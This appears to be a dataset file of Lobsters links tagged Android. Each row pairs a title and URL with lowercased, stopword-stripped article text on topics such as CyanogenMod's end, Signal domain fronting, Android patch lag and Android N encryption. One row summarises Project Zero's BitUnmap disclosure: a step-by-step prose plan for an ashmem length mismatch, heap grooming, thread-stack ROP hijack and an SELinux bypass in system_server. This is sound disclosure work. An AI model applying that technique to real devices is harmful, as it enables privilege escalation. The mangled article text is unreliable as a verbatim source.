311,Lobsters,android,Android,The Death of CyanogenMod and What it Means for Development,https://www.xda-developers.com/the-death-of-cyangenmod-and-whats-in-store-for-the-future/,death cyanogenmod mean development,death cyanogenmod mean development king dead long live king bit earlier expected cyanogen modular o program cyanogen steve kondik cyanogen service cyanogensupported nightly build willâ discontinued death cyanogenmod separate blog post monetary infrastructural support cyanogenmod cyanogen inc cease longer receive nightly build continue official development project rebrand lineageos cyanogen inc shutting future development sultanxda depend entirely much support lineageos receives development community lineageosorg twitter facebook google addendum archive archive archive,death cyanogenmod mean developmentthe king dead long live king appears cyanogen inc pulled plug cyanogenmod bit earlier expected see addendum end article archived linkscyanogen inc finally delivered aâ bullet brain cyanogenmod year tumultuousâ turnover company cyanogen recently announced company would consolidateâ effort new cyanogen modular o programas part consolidation company announced many employee including cyanogen steve kondik would part way company finally today company announced cyanogen service cyanogensupported nightly build willâ discontinuedâ december death cyanogenmodafter cyanogen inc announced news official blog many people confused speculated wouldâ really happen cyanogenmod people convinced nothing would change respect favorite custom rom small part thanks many blog misinterpreting cyanogen inc statement however team behind cyanogenmod clarified would mean popular android distribution separate blog post essence gist changing monetary infrastructural support cyanogenmod cyanogen inc cease includes paid developer contributing code open source project well nightly build serversâ cyanogenmod longer receive nightly build december wait team simply find another host build nightlies cyanogenmod team continue official development project cyanogen inc owns right brand cyanogenmod team decided longer worth continuing development open source distribution without monetary infrastructural support addition even team find alternative revenue stream perhaps via donation trouble worth due potential legal issue could involved cyanogen inc brand company owns including cyanogenmod sold another company plus team argues cyanogenmod brand tainted due association cyanogen new user may wary installing cyanogenmodhowever cyanogenmod rebrand lineageos hearing project behind scene past week official confirmation regarding purpose effort presumably run steve kondik hoping revitalize made cyanogenmod great grassroots communitydriven effort android distribution know lineageos take conceivable team could find build server set everything mimic old cyanogenmod infrastructure end result would mean little would change end usercyanogen inc shutting least yet made clear earlier blog post seen confusion regarding news warranted clarification company downsizing focus new project cyanogen modular o program merely cutting service believe longer maintainalthough cyanogenmod officially dead open source project live lineageos move mean average user developer future developmentit difficult say happen multiple scenario could play future lineageos really take finding significant support individual developer pledge continue maintaining lineageos respective device furthermore team able acquire source funding probably donation provide hosting server build nightlies given smaller android distribution able find server building nightlies inconceivablelineageos take operation toned given scale cyanogenmod operation massive amount funding contributed cyanogen inc maintain support device may difficult find support developing lesser known device case many device may suffer development drought development community largely relied cyanogenmod provide stable branch individual could fork popular device le likely affected given high demand development high amount developmental talent attracted devicelineageos fails take matter look would terrible enthusiast community issue mentioned would compounded many user would lose access one stable longest lasting custom rom android world developer would mean would look elsewhere stable base example xda recognized developer sultanxdaâ told u would touch lineageos stable branch might instead turn aospa base luckily oneplus owner pose problem device stable aospa base future stable cm base hard say happenall hypothetical scenario indeed fork road cyanogenmod custom rom developer whatever scenario play depend entirely much support lineageos receives development community whether death cyanogenmod spell death stable custom rom development certain device developer user alike used cyanogenmod rom past would like show support critical time ensure spirit project life lineageosyou follow lineage o atâ lineageosorg â twitter facebook googleaddendum website wiki forum gerrit download server taken day promised date thankfully user scrambling archive much material could get since announcement material managed survivehere archive cyanogenmod blog post bidding project farewell archive cyanogenmod wiki archive cyanogenmod snapshot build data hoarder across net racing see else salvage keep reader updated major development story
312,Lobsters,android,Android,Signal messager circumvenes censorship (in Egypt and UAE),https://whispersystems.org/blog/doodles-stickers-censorship/,signal messager circumvenes censorship egypt uae,background censorship circumvention domain fronting way look indistinguishable uncensored traffic facebook want get involved signal hiring,latest signal android release includes support adding doodle sticker text imagesthis release also includes support censorship circumvention egypt united arab emiratesbackgroundover weekend heard report signal functioning reliably egypt united arab emirate investigated help signal user area found several isps blocking communication signal service website turn state snoop censorcensorship circumventionin country small number isps apply filtering rule defined state circumventing censorship difficult always turn network access entirely goal app like signal make disabling internet access way government disable signaltoday signal release us technique known domain fronting many popular service cdns google amazon cloudfront amazon azure cloudflare fastly akamai used access signal way look indistinguishable uncensored traffic idea block target traffic censor would also block entire service enough large scale service acting domain front disabling signal start look like disabling internetwith today release domain fronting enabled signal user phone number country code egypt uae user send signal message look like normal http request wwwgooglecom block signal message country would also block googlecomfollowup release include detecting censorship applying circumvention needed eg user phone number country visit place censorship deployed signal work without vpn well expanding service domain front signala signal io release censorship circumvention also available beta channel production shortly always want live edge sign signal io beta channel emailing support whispersystemsorg facebookwant get involved signal hiring
313,Lobsters,android,Android,Froid: A library for using Frege in Android development,https://github.com/mchav/froid,froid library using frege android development,froid usage example froid wiki stepbystep tutorial simple activity example building froid contributing,froid library using frege programming language android development usage example getsetup froid read instruction froid wiki write simple application scratch follow stepbystep tutorial simple activity module iogithubmchavfregeandroidfregeactivity import froidappactivity import froidcontentcontext import froidosbundle import froidwidgettextview native module type activity oncreate activity maybe bundle io oncreate bundle tv textviewnew tvsettext hello android love frege thissetcontentview tv example find involved example available soon building froid run compile package contributing lot create binding type android class adaptersfragments read learn design philosophy subclassing pr nature welcome
314,Lobsters,android,Android,Open sourcing our Android and iOS apps! - Kickstarter,https://kickstarter.engineering/open-sourcing-our-android-and-ios-apps-6891be909fcd,open sourcing android io apps kickstarter,open sourcing android io apps android io open source functional swift conference public benefit corporation charter prior art open sourcing eigen fun thing explore screenshots use view model test iterative development styling updating design updating design functionality journey open source android app rxjava functional core imperative shell functional swift conference brooklyn swift meetup functional swift conference brandon chris christella courtney gina lisa stephen next hiring,open sourcing android io apps today kickstarter engineering team open sourcing android io apps excited future working opennative squad enjoying postlaunch winter sunshinewhy open source native team kickstarter responsible building maintaining feature android io focus writing welltested code built part easily understood adopted many functional programming technique ton benefit predicted start excited share finding developer communitywe started organizing functional swift conference hosted first two conference kickstarter office moved budapest wanted give space swift developer new old functional programming come together share ideasbuilding conference wanted take sharing step idea open sourcing apps came around time kickstarter became public benefit corporation putting commitment public good core company charter started thinking could embrace principle engineer believe open sourcing give new level transparency engineering culture also provide useful resource global developer communityprior artit would impossible organization open source io application without mentioning monumental contribution artsy made area inspired artsy open sourcing eigen openbydefault policy general provided community great service thankful initiative takensome fun thing explorehere quick glance thing particularly proud screenshots directory hold nearly screenshots various screen every language device edgecase state example backer viewing project french creator looking dashboard german ipad herewe use view model lightweight way isolate side effect embrace functional core write pure mapping input signal output signal test heavily including test localization accessibility event trackingwe use swift playground iterative development styling major screen app get corresponding playground see wide variety device language data real time browse collection playground hereour first two pull request open source repository updating design backer activity feed updating design functionality user profilethe journey open sourcebrandonthe native engineering team kickstarter coming hectic period development yearandahalf ago two io engineer brandon gina worked fouryearold objectivec codebase majority written brandon early day kickstarter even android appchrisone winter day chris backend engineer expressed interest building android app moved work fulltime along way hired lisa former summer intern help android brandon gina also jumped made great contribution projectin le eight month four engineer never written production java code let alone production android code shipped grueling rewarding experience final product wellreceived stable great way backer explore projectslisaone tool employed start java code functional programming regardless difficult write truly functional code java knew embraced immutable data structure pure function best ability would able avoid lot complexity creep application naturally led using rxjava wrangling ui interaction declarative fashion came simplified way separating pure logic sideeffects code much spirit functional core imperative shellstephenthe result highly testable code base could fully understood isolation concern interacted rest system quite proud code dust settled releasing kickstarter android left sinking feeling still fouryearold objectivec codebase poke back aliveginaluckily team quite familiar swift community headed brandon coorganizing functional swift conference gina cohosts brooklyn swift meetup extensive knowledge could leverage swift type system better express problem wanted model also android experience knowledge build application ground way allowed u piece together functional part sideeffects boundarieschristellathus embarked yet another formidable journey rewriting io app swift creating something entire team could share ownership amplified thing learned work android many time unwavering eye writing much pure functional code possible writing way enhanced testability seeing new thing would unlock u every turn excited development gave two separate talk year functional swift conference cool thing katieas native engineering team often look back functional programming important tool empowered u work way team mixed skill background experience level became team could write understandable welltested code android io platform found common philosophical basis development functional programming importantly tried overidentify engineer specific platform rather look software development holistic disciplinemaggiethere open source software would possible without effort entire native squad brandon chris christella courtney katie gina lisa maggie stephencourtneywhat next excited working open able share cool thing come freely challenge face honestly quite thing look forward including writing first kotlin code android exploring new way writing declarative view course big swift migrationif sound interesting hiring sincerely kickstarter native team
315,Lobsters,android,Android,Why Google Pixel lags 10x more than Moto Z,http://taras.glek.net/post/Moto-Z-has-10x-less-lag-than-pixel/,google pixel lag moto z,writes moto z google pixel benchmark driver motorola smoked google storage perf weird fuse fork wrapfs paper watch preso xfs faq conclusion moto z commentshackernews commentsreddit update email,previous post made argument modern phone fast slowest component ability nand handle writes decided compare two android flagship opposite end benchmark spectrum moto z v google pixel wrote little fio benchmark driver fill available device storage random writes print perf stats along way idea run benchmark data partition fill available space writing another round testing data chart io complete x number device moto z median value around pixel difference widens mobile phone magic number amount time one update screen butterysmooth optimistically one roughly translate datapersistence operation android atleast sequential random writes bestcase wal sqlite mode app saving single piece data expect eaten io pixel device busy expect number rise quickly note bestcase performance device expect performance degrade age expect pixel drop frame stutter age pixel performs relatively poorly test motorola smoked google storage perf spent day poking around filesystems developing benchmark experiment motorola division lenovo bravely gone beyond stock android reduce storage lag got motoz performing close highend laptop ssds motorola answer hiding procmounts file google added weird permission model common storage pool android fit either lazyness rushing meet pm deadline feature user asked wrote passthrough fuse filesystem enforce crossappfilesharing mean pixel every user io get roundtrip back userspace hitting nand fuse burn cpu slows io love fuse thing like sshfs terrible application motorola thought little harder replaced nasty fuse hack esdfs fork wrapfs data pixel us traditional linux filesystem motoz opted new filesystem developed samsung amazing read paper watch preso drove development filesystem specifically twitterfbetc workload captured phone many neat thing thing best avoid fsync writeamplification flag fsyncs via block metadata instead full checkpoint mean fsync requires le write operation interestingly competing filesystems like btrfs even higher fsync write amplification think tradeoff slightly slower recovery time net motoz speedup increase nand lifespan expect motoz age much better pixel nobarrier motoz interesting mount option soup mounting rw seclabel nosuid nodev noatime nodiratime backgroundgcon discard userxattr inlinexattr acl inlinedata nobarrier extentcache kick took usb harddrive formatted applied mount option suddenly hard drive faster pixel wtf key option nobarrier effectively make fsync noop explains difference performance see xfs faq best description nobarrier feature performance difference come motoz either awesome implemented ramcache solution cellphone betting excellent crashrecovery ability really brave behalf user even implement batterybackedramcache nand overly horrible recovering crash probably still right choice user much happier longlasting phone might forget couple second data device trashed year use anyone root pixel motoz would interesting see underlying block device perform differently suspect similar motorola differentiates entirely software conclusion android oems like motorolasamsung author improving android performance moto z recent android drastically reduced storage lag next time shopping try avoid buying device slow point unusable nand wear ala nexus nexus doubt anyone would spot difference brand new pixel motoz however year use difference stark phone reviewer vigilant shame poorlyimplemented device recommending pixel family member recommending people buy moto z wificell reception seems worse z pixel camera worse commentshackernews commentsreddit update confusing ui state transition ui animation android animation framework run main thread disregard section followup twitter discussion android engineer made solid case likely hack motorola made nobarrier noop hw needed sw eg email unclear nobarrier deemed safe one could theorize motorola spent time qaing failure scenario still hoping android vendor implement batterybackedramcache solve motoz considered risky prototype storage performance like interesting see prediction pixel aging worse z come true doubt bottleneck android workload motoz
316,Lobsters,android,Android,F-Droid applications statistics,https://fossdroid.com/blog/foss-applications-statistics.html,fdroid application statistic,fo application statistic application category source code used license,fo application statistic fdroid repository catalogue free open source software application android platform application also google play organized category category count graph system multimedia game internet navigation science education theming time reading writing development connectivity security phone sm money sport health graphic apps source code site source site count graph githubcom codegooglecom bitbucketorg gitlabcom sourceforgenet gitoriousorg launchpadnet used license license count graph mit newbsd gpl wtfpl lgpl publicdomain freebsd
318,Lobsters,android,Android,BitUnmap: Attacking Android Ashmem,https://googleprojectzero.blogspot.com/2016/12/bitunmap-attacking-android-ashmem.html,bitunmap attacking android ashmem,,posted gal beniamini project zero law leaky abstraction state nontrivial abstraction degree leaky blog post explore ashmem shared memory interface provided android see false assumption internal operation result security vulnerability affecting core system code walk process discovering exploiting vulnerability resulting leaky abstraction allow u elevate privilege android application multitude privileged context including highlyprivileged systemserver vulnerability present core android platform code marshmallow nougat version fixed recent android bulletin detailed disclosure timeline see timeline section one device bind know android application perform interprocess communication example order communicate various android service using android binder initially android service register central daemon service manager subsequently application may contact daemon order request handle registered service may contacted keeping good ipc design interface provided binder rather simplified fact binder transaction capped size atmost well scenario need transfer large amount data system service example want modify phone wallpaper playing medium file surely need reinvent mechanism memory shared larger quantity process using binder transaction indeed need worry see binder transaction support transfer binary data fact binder transaction used transfer file descriptor even binder handle instance service manager able provide process handle may communicate requested service great mean communicating process even large volume case like share rather simply transfer large quantity memory need worry purpose android introduced mean sharing memory called ashmem android shared memory sharing memory caring exactly ashmem short ashmem file descriptor act handle shared memory region device also allows user perform several memorysharing operation via set supported ioctls allow user set size shared memory region referred ashmem file descriptor modify name shared region even control protection mask descriptor may mmaped let take closer look actual implementation ashmem device starting ioctl used control size shared memory region ashmemsetsize see ioctl simply allows user pas size long shared memory region mapped yet device happily record passedin size underlying size corresponding memory region recorded size queried user issuing corresponding ioctl ashmemgetsize look rather suspicious exactly setting size actually mean recall ashmem region mappedin calling mmap know mmap syscall receives argument denoting size mapping created begs question size created mapping match size ashmem region perhaps implementation mmap simply ignore passed size argument use size provided ashmemsetsize perhaps instead implementation mmap simply ignore underlying size use size argument instead one way find see actual shared memory file created using size shared memory region using shmemfilesetup memory mapping created using size virtual memory area vma size passed mmap let take step back reflect decision essentially mean developer attempt use ashmem region must take special care always call mmap using size underlying shared memory region failing return visible error code developer instead create mapping potentially dangerous consequence starter developer mmaps region size larger actual underlying region size attempt access memory beyond bound underlying region result illegal access sending sigbus signal process probably subsequently terminate another interesting potential pitfall developer erroneously assumes size underlying shared memory region mmaped size must equal one another try answer question audited instance android service use ashmem share memory user focus one case bitmap mismatching assumption mentioned earlier one operation requires transfer potentially large quantity memory one process another exchange image purpose android expose bitmap class easily serialized binder parcel bitmap may larger limit binder transaction image data must transferred via mean ashmem indeed bitmap certain size exactly data transferred see looking unflattening function bitmapcreatefromparcel first image metadata extracted parcel used construct skbitmap instance hold information next function proceeds read actual bitmap data calling parcel readblob however look potentially dangerous first note function us skbitmap instance ie one holding metadata read earlier order calculate size resulting bitmap data call parcel readblob order actually read transferred data using previously calculated size input argument finally let take look parcel readblob actually read enclosed bitmap data aha exactly looking instead using underlying size memory region parcel readblob performs mmap operation using controlled length argument ie size computed bitmap metadata already bad practice user could pas ashmem descriptor arbitrary size resulting invalid memory mapping type discussed earlier turn would trigger sigbus receiving application attempt access mmaped memory region perhaps better creating invalid mapping seen memory mappedin creating bitmap unmapped well reading bitmap data bitmapcreatefromparcel proceeds store information mapped data constructed bitmap instance however instead using size previously created mapping constructor simply retrieves size mapping using ashmemgetsize ioctl using thinwrapper ashmemgetsizeregion false assumption namely underlying ashmem size size mmaped region must equal one another finally bitmap freed area unmapped calling putting together mean mmap munmap call performed potentially different length argument fully controllable attacker mismatch mmaped munmaped length provides u great exploitation primitive specifically could supply short length mmap operation longer length munmap operation thus resulting deletion arbitrarily large range virtual memory following bitmap object moreover need deleted range contain one continuous memory mapping since range supplied munmap simply ignores unmapped page delete range memory attempt recapture memory region controlled data causing another allocation remote process forcibly free data structure replace content chosen data effectively forcing useafterfree condition refer crafted bitmap mismatching length bitunmap thinking exploit strategy finding target service okay finally good exploitation primitive use order write stable exploit allow u gain code execution systemserver first need find binder call systemserver unflattens bitmap object unparcels bundle containing bitmap binder transaction moreover would advantageous able access call context requiring permission luckily systemserver house many different binder service increasing odds finding comfortably exploitable endpoint one candidate notification service provides interface interaction notification bar among operation supported service application even running isolatedapp selinux context requiring permission whatsoever may attempt add notification object handled notification service moreover notification object complex may contain image bitmap along presented text using notification also advantageous completely different reason lifetime controlled attacker remember free memory range remote process like recapture memory region controlled data well already seen bitmap object mmaped remote addressspace contain completely controlled data notification added notification bar notification object remain referenced remote process notification removed effectively mean use notification dual purpose finding target data structure established ability unmap arbitrarily large memory region systemserver crafting notification object containing bitunmap instance still need think method able reliably hijack control flow systemserver need decide data structure unmap using primitive first consider fact bitunmap object allocated calling mmap due behaviour mmap simply inhabit highest memory address mm mmapbase tasksize contains sufficiently large contiguous hole mean example attacking single c java object would rather difficult located heap surrounded data structure would repair moreover even able hijack data structure would still need craft content way would allow u eventually hijack control flow example exploiting useafterfree vulnerability c object normally includes hijacking vtable replacing structure pointing executable memory location modern exploit mitigation technique amount step required bypass xnbit protection aslr could quite substantial perhaps cleaner way get code execution optimally looking replace data structure following property allocated directly using mmap ie heap allows direct control code execution require addressspace dependant information unique systemserver order find magical structure written small gdb script monitor log call mmap coupled origin size helped group family mmaped object could useful exploitation producing list one candidate stood property thread hanging thread know thread process share address space moreover systemserver large process contains many code path handle longrunning periodic task naturally code path handled creating additional thread systemserver thread created require two data structure unique thread thread metadata pthreadinternalt thread stack looking code android bionic see two region fact carved memory region allocated using mmap able deallocate thread stack immediately reclaim able directly achieve code execution simply virtue already prepared stack performs whichever operation like execute within systemserver regardless start scheming hijacking thread need think way spawn thread systemserver ondemand going available binder call terminating systemserver reveals one comfortably accessible codepath audioservice loadsoundeffects binder command called without requiring permission cause audioservice load predefined set sound effect internal sound pool creating pool cause systemserver spawn several thread exploit hijack soundpoolthread variety reason first thread created creating new sound pool fact come handy later try force allocated controlled memory region initializing sound pool soundpoolthread awaits command waiting condition variable condition variable signaled futex systemcall return thread access stack waiting systemcall return allows u replace thread stack leaving thread none wiser performed switch trigger chain event closing sound pool calling unloadsoundeffects signal condition variable cause systemcall return sound pool closed soundpoolthread longer needed simply terminates anyway mean safely hijack without causing adverse effect systemserver short rop chain hijack soundpoolthread stack need replace rop stack run well version android prior could simply write short rop chain mmaps one ashmem file descriptor executable accesspermissions jump directly indeed would allow u simply place executable code base ashmem descriptor send along systemserver however android solution would longer work starting android new set mitigation begun roll aim prevent unauthorised code execution within systemserver privileged process small subset rule seen systemserver never use jit functionalityneverallow systemserver self process execmem neverallow systemserver ashmemdevice chrfile execute neverallow systemserver systemservertmpfs file execute specifically second rule prevents ashmem file descriptor mapped executable within systemserver moreover use execmem first rule prevents systemserver mapping new executable memory region within process could still write large rop chain perform whichever set command like within systemserver due breadth systemserver rop gadget could conceivably even turingcomplete however seems incredibly complex manually quite time consuming automate instead could look way directly bypass mitigation mentioned looking selinux context executed within systemserver short search stumble upon following selinux rule systemserver never execute anything data except datadalvikcache filesneverallow systemserver datafiletype dalvikcachedatafile mapping protexec file noxfileperms okay file selinux context dalvikcachedatafile may freely mapped executable make sense android application installed go optimization process resulting new file may executed quickly systemserver load many optimized file need able map executable use systemserver may use file directly create fact process allowed create file context installd installer daemon distinction however purely semantic due fact systemserver directly issue command installd using special socket one command issued cause installd start optimization process resulting file dalvikcachedatafile context chosen file chosen destination thus rop chain would need open installd socket issue command create wanted executable chunk finally map new file executable could even go one step since launching attack android application could simply embed executable shellcode within source code application example within static byte array application installed optimized resulting new file type dalvikcachedatafile luck would optimization process garble static byte array meaning shellcode reside new executable file finally need simply locate optimised file disk map executable lastly crafting rop stack need know start writing gadget relative stack base address need know accurate position stack stack pointer placed soundpoolthread enters command loop luckily avoid need guess top stack place ropslide using additional trick simply start thread process creating sound pool object wait enter command loop thread settle read proc pidstat task measure value sp token base address stack thread bypassing need bypass aslr avoiding question aslr mistake rather happy accident order allow fast application startup time android application forked single process appropriately named zygote process preloads many commonly used shared library resource thus saving application need launched among process forked zygote target exploitation systemserver essentially mean portion address space inherited zygote shared systemserver including multitude shared library available disposal manage hijack running thread create entire valid rop stack using gadget address located address space long stick zygoteloaded shared library allows u ignore aslr purpose exploit stage exploit addressindependent anyway shaping address space lastly put together complete exploit still lack ability shape remote address space specifically need reach state cause targeted object would like delete placed controlled memory region could freed subsequently reclaimed recall behaviour mmap dictate every allocation chosen memory address always highest address range mm mmapbase tasksize contains sufficiently large contiguous unmapped region make mmap optimal allocator use attempting shape address space allocator require special condition order revert contiguous allocation case already know would like replace memory region reserved thread stack denote size region threadsize first send large amount notification object remote service containing bitmap size threadsize allow u fill hole remote address space may opened lifetime systemserver guaranteed subsequent allocation size threadsize contiguous placed top current mmaped region next allocate many consecutive bitmap object size threadsize referenced single notification object intentionally remove single notification consecutively allocated set proceed bombard systemserver process many small binder transaction triggering remote garbage collection occur turn free space previously held bitmap object removed notification creating threadsize sized hole like reload audio effect causing soundpoolthread spawned systemserver threadsized allocation previous hole size already filled bitmap object populate vacant hole created amidst chunk contiguous bitmap remove notification directly front soundpoolthread stack trigger remote garbage collection cause another hole open bringing u following state strategically opened hole front soundpoolthread send crafted bitunmap object create metadata size ie size used mmap equal threadsize however size ashmem descriptor actually twice size mean bitunmap freed remote process unmap along soundpoolthread finally freed soundpoolthread stack send one notification time size threadsize fill last created hole effectively replacing region held bitunmap region containing soundpoolthread stack putting together long last step needed create complete working exploit short rundown step discussed allow u hijack thread within systemserver process using crafted rop stack build rop stack using gadget zygoteoriginating shared library unload sound effect closing current soundpoolthread present allocate many bitmap size threadsize force consecutive allocation open hole middle consecutively allocated bitmap reload sound effect create new soundpoolthread within created hole open new hole directly front previous hole send bitunmap object fit newly created hole force remote gc cause bitunmap free soundpoolthread allocate new bitmap occupy space previously held soundpoolthread unload sound effect causing condition variable signalled thereby triggering soundpoolthread start executing using crafted stack afterword although blog post quite lengthy many smaller detail neglected mention favour brevity encourage anyone interested dig full source code exploit discover missing piece along source code exploit also releasing project used easily create shellcode use exploit specifically project contains small assembly stub fixed freed pthreadinternalt structure top stack corrects threadlocal storage register point new location performing needed fixups simply jump shellcode main function order allow easy shellcode creation highlevel language c rather handcoding assembly shellcode wrapper us custom linker script prepend small fixup stub shellcode compiles shellcode position independent find source code shellcoder timeline vulnerability reported initial response android security assigned androidid exploit submitted android security android notify fix present next partner bulletin assigned vulnerability fixed released november bulletin
321,Lobsters,android,Android,Android security in 2016 is a mess.,https://cpbotha.net/2016/11/27/android-security-in-2016-is-a-mess/,android security mess,summary incident popular blu phone sold amazon u regularly alist phone maker android security patch level november android security bulletin lg seems tracking google security update quite well scary little aside quadrooter scanner app rooted pillaged old innocentlooking app google leniency cut way billion android user vulnerable ben evans post buy iphone really buy iphone io released year ago already advanced android nougat phone encryption blog post stick android pixel nexus google policy forâ pixel nexus security consider installing custom rom copperheados update lg nexus huawei nexus copperheados preinstalled keep manufacturer honest huawei pretty good record addendum android phone acceptable security update record blackberry priv tipped fact blackberry android phone get monthly security update crackberry blackberry android security bulletin november blocked carrier original blog post blackberry explained security patching policy priv update wednesday,summary phone probably contains banking payment personal information remotely stolen via numerous known unknown bug android software attractive criminal vendor lg samsung xiaomi etc selling phone incentive keep yourâ phone software date google fix android phone probably date therefore gaping security hole attacker steal stuff safety laptop read billion google android phone march click image source might recently read incident popular blu phone sold amazon usâ interestingly author deleted article hackernooncom medium link wayback machine stored copy turned phone regularly sending bunch personal information server china text message call log contact list forth investigation came light happening via lowlevel piece software called adups google previously updated system check adups mediatek make chipset million lowend phone simply modified system software evade google check nice one mediatek painful example fact software phone although based google software customised phone vendor frustrating effect google release security patch android regularly little incentive phone vendor spend money updating phone already sold alist phone maker bought lg south africa lg flagship year sold extremely well lg wellknown smartphone oem however took step flash official kdz image consumer would normally running android however security patch level meaning month security update check android security patch level going setting general phone software info think six month lag bad nice example vulnerability november android security bulletin severe issue critical security vulnerability could enable remote code execution affected device multiple method email web browsing mm processing medium file short phone could hacked wide open afar single innocentlooking email mm webpage friend south african lg still stuck android probably blocked due carrier mtn case even show security patch level idea many month security fix phone missing lg seems tracking google security update quite well somehow update reaching phone scary little aside tried check point lab quadrooter scanner app lg saw lg marshmallow android security patch level vulnerable quadrooter manually updated lg still much vulnerable quadrooter theory â phone could already rooted pillaged old innocentlooking app although keep mostly official play market risk slightly mitigated stage even relatively knowledgeable user much patch phone vulnerability google leniency cut way billion android user vulnerable fantasticâ google openness leniencyâ android helped make smartphone technology accessible billion user probably closer billion taking account chinese android phone connected google service see ben evans post however leniency allows manufacturer irresponsible keeping customer safe fundamental problem great deal android phone vendor make phone absolute entrylevel topoftheline flagship littleâ incentive spend money postsale security update paid phone important enough anymore secure ish telephone buy iphone really using android since htc desire z love android love linux using since however money object myâ sound advice buy iphone apple still shipping security update albeit io iphone released year ago iphone still kept date io furthermore term phone encryption â io released year ago already advanced android nougat released august year short already apple made better choice exactly different file encrypted whilst android implemented full disk encryption smartphone usecase right choice nougat android finally also changed filebased missing important part puzzle phone encryption blog post link insightful please take look stick android pixel nexus prefer sticking withâ android best choice getting official google device mean either nexus new pixel google policy forâ pixel nexus security state ship security update either three year device introduction year device last officially sold google store whichever longer unfortunately iphones really expensive google new pixel device also aiming higherend market previous generation nexus phone offer midrange temporary reprieve word normal consumer budget ie largest part android user base actually smartphoneusing world stuck insecure vulnerableâ phone cool consider installing custom rom installing custom rom cyanogenmod brings another set issue regard phone rooted regard driverlevel support proprietary hardware case something average consumer access android guru certainly apply effort like copperheados hardened android certainly promising quite accessible largest group android user update david metcalfe pointed comment buy secure android phone copperhead â u canada budget couldâ buy lg nexus huawei nexus copperheados preinstalled great available due price geography really accessible android user keep manufacturer honest ideally google start taking much harder line manufacturer put android phone could example maintain publish list phone model kept date latest security fix list happy see leastâ huawei pretty good record term keeping android phone date although result probablyâ skewed counted huaweiproduced nexus phone formed majority test set doh factor play role next smartphone buy know manufacturer affordable android phone committed keeping user safe please let know comment addendum android phone acceptable security update record blackberry priv lobster user jabberwock tipped fact blackberry android phone get monthly security update read crackberry blackberry android security bulletin november look like phone receive monthly update blocked carrier sigh â already received november update original blog post blackberry explained security patching policy priv update wednesday wanted post relevant update go okay one
322,Lobsters,android,Android,Android N Encryption,https://blog.cryptographyengineering.com/2016/11/24/android-n-encryption/,android n encryption,heard smartphone encryption sophisticated decryption attempt undo security grugq secure android phone background file disk encryption least early builtin feature key derivation function tpm full disk encryption fde truecrypt bitlocker filevault disk sector filebased encryption fbe encfs ecryptfs android dmcrypt alternative finegrained access control complete protection class key protected first user authentication class key protection accessible fourth option public key encryption hell android well applelike approach us file encryption useless brick following reboot credential encrypted storage device encrypted storage android making change problem filesystem encryption code key easy steal vold daemon hardware guaranteed mean disproportionately poorer atrisk,past year heard smartphone encryption quite frankly u expected hear lifetime learned proper encryption slow even sophisticated decryption attempt done correctly also learned incorrect implementation undo security word phone encryption area detail matter past week looking bit android nougat new filebased encryption see well addressed detail latest release answer unfortunately still lot work post going talk bit aside inspiration post come grugq loudly angrily trying work kink develop secure android phone credit credit due background file disk encryption disk encryption much older smartphones indeed early encrypting filesystems date back least early proprietary implementation may go back even relatively new area pc operating system disk encryption builtin feature since early typical pc disk encryption system operates follows boot time enter password fed key derivation function derive cryptographic key hardware coprocessor available eg tpm key strengthened tangling secret stored hardware help lock encryption particular device actual encryption done one two different way full disk encryption fde system like truecrypt bitlocker filevault encrypt disk level disk sector allornothing approach since encryption driver necessarily idea file sector represent time fde popular mainly extremely easy implement filebased encryption fbe system like encfs ecryptfs encrypt individual file approach requires change filesystem benefit allowing fine grained access control individual file encrypted using different key commercial pc disk encryption software historically opted use fulldisk encryption fde approach mostly matter expediency fde significantly easier implement philosophically also reflects particular view disk encryption meant accomplish view encryption allornothing proposition machine either accessible inaccessible long make sure laptop stolen disk encryption keep perfectly safe android android early attempt adding encryption phone followed standard pc fulldisk encryption paradigm beginning android kitkat android marshmallow android system shipped kernel device mapper called dmcrypt designed encrypt disk sector level represented quick dirty way bring encryption android phone made sense believe phone tiny pc problem smartphones pc major difference smartphone user never encouraged shut device practice mean enter passcode boot normal user spend whole day walking around cryptographic key ram since phone battery live day long time compared laptop encryption really offer much protect attacker get hand phone time course user lock smartphones principle clever implementation could evict sensitive cryptographic key ram device lock rederive next time user log unfortunately android simple reason android user want phone actually work without cryptographic key ram fde system loses access everything storage drive practice turn brick excellent reason boot android fde phone never evict cryptographic key ram good alternative android game town come phone encryption apple part also gave problem lot thought came subtly different solution starting io apple included data protection feature encrypt data stored device unlike android apple use fulldisk encryption paradigm instead employ filebased encryption approach individually encrypts file device apple system content file encrypted unique perfile key metadata encrypted separately file key turn encrypted one several class key derived user passcode hardware secret embedded processor io data encryption source io security guide main advantage apple approach instead single fde key rule apple implement finegrained access control individual file enable io provides api developer use specify class key use encrypting given file available protection class include complete protection file encrypted class key accessed device powered unlocked ensure class key evicted ram second device lock protected first user authentication file encrypted class key protected user first log reboot key remains memory protection file accessible even device rebooted user yet logged giving developer option individually protect different file apple made possible build application work device locked providing strong protection file containing sensitive data apple even created fourth option apps simply need create new encrypted file class key evicted ram class us public key encryption write new file safely take picture even device locked apple approach perfect however obvious result long careful thought process raise following hell android well short answer android trying sort let explain android nougat google moved away fulldisk encryption primary mechanism protecting data rest set passcode device android n system configured support applelike approach us file encryption far good new system called direct boot named address google obviously saw fatal problem android fde namely fdeprotected phone useless brick following reboot main advantage new model allows phone access data even enter passcode enabled providing developer two separate encryption context credential encrypted storage file area encrypted user passcode available user enters passcode device encrypted storage file encrypted user passcode though may encrypted using hardware secret thus available boot even user enters passcode direct boot even provides separate encryption context different user phone something quite sure sure android making change problem one thing might noticed apple four category protection android n two two missing category cause problem complete protection category allow user lock device following first user authentication evict key memory course might argue android could provide forcing application developer switch back device encrypted storage following device lock problem idea twofold first android documentation sample code explicit thing work moreover quick read documentation show even wanted unambiguous way android tell application system relocked key evicted device locked application unexpectedly find file access returning error even system application tend badly happens course assumes android n even try evict key lock device current filesystem encryption code handle lock bad important stress real problem really cryptography problem since google giving developer proper guidance company may locking android year insecurity without even halfbaked solution define complete protection class android app developer build apps correctly support idea device lock even android get around implementing key eviction existing legacy app base able handle since break million apps implemented security according android current recommendation short thing get right start look like moment android getting right key easy steal course reasonable ask whether key ram big concern first place key actually accessed answer question bit complicated first somebody hardware lab forensic expertise answer almost certainly yes entered passcode derived key stored magically secure part phone people ability access ram bus line device potentially nick lot work software perspective even worse software attack would require way get past phone lockscreen order get running code device older pren version android attacker might need escalate privilege get access kernel memory remarkably android n even store disk key kernel instead held vold daemon run user root userspace make exploit trivial certainly best way handle thing course mostly irrelevant main point key loaded need steal way get past lockscreen access file disk hardware although bit tangent worth noting many highend android phone use sort trusted hardware enable encryption common approach use trusted execution 